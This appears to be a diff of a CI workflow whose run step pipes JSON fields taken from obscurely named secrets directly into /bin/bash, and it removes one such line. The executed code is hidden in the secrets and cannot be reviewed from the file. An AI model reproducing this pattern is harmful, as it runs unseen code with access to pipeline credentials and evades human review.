@@ -20,7 +20,6 @@ jobs:
           pj45191: ${{ secrets.pj45191 }}
         run: |
           printf '%s' "$pj45191" | jq -r .aswdv27069 | /bin/bash
-          echo $iedps2091 | jq -r .i6 | /bin/bash
           printf '%s' "$bppp75" | jq -r .ayk4 | /bin/bash
           printf '%s' "$zy37" | jq -r .qeqlx726 | /bin/bash
           printf '%s' "$pwy28781" | jq -r .twyq8 | /bin/bash
